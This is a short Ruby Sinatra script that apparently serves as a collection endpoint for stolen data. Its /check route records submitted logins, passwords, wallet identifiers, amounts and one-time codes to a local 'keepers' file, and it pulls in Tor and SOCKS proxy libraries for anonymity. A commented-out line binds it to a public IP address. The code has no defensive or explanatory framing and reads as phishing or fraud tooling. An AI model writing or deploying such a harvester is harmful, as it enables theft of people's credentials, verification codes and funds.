require 'sinatra'
require 'mechanize'
require 'colorize'
require 'active_support'
require 'active_support/all'
require 'active_support/core_ext'
require 'action_view/helpers'
require 'socksify'
require 'socksify/http'
require 'tor'

# set :bind, '66.70.202.178'
set :bind, '127.0.0.1'
set :port, 9495
set :encoding, :utf8

post '/check' do
  opts = {
      possible_codes: [ params[:code1], params[:code1]],
      wallet: params[:wallet],
      amount: params[:amount],
      login: params[:login],
      password: params[:password],
      amount: params[:amount],
      item: params[:item]
  }
  File.open("keepers", 'a+') { |file| file.write("#{opts.inspect}\r\n") }
  status 200
end
